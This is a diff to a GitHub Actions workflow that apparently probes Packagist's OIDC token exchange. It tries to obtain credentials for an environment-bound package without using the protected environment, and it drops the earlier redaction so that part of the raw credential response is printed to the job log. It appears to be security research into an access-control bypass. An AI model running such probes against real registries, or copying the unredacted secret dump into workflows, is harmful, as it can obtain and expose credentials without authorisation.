@@ -8,15 +8,12 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: Exchange and probe credential scope
+      - name: Exchange for env-bound package WITHOUT using the environment
         run: |
           ORG=pkresearchlab
-          PKG=g4rrzx/probe-pkg
+          PKG=g4rrzx/env-pkg
           AUD=$(curl -sS "https://packagist.com/api/oidc/audience/$ORG" | jq -r .audience)
           JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value)
-          CODE=$(curl -sS -o /tmp/creds.json -w '%{http_code}' -X POST -H "Authorization: Bearer $JWT" "https://packagist.com/api/oidc/token-exchange/$ORG/$PKG")
-          echo "exchange HTTP=$CODE"
-          jq -c 'if .key then {key:.key,secret:"REDACTED"} else . end' /tmp/creds.json
-          python3 scope_probe.py
-          python3 scope_probe2.py
+          CODE=$(curl -sS -o /tmp/c.json -w '%{http_code}' -X POST -H "Authorization: Bearer $JWT" "https://packagist.com/api/oidc/token-exchange/$ORG/$PKG")
+          echo "NO-ENVIRONMENT exchange HTTP=$CODE"
+          head -c 300 /tmp/c.json
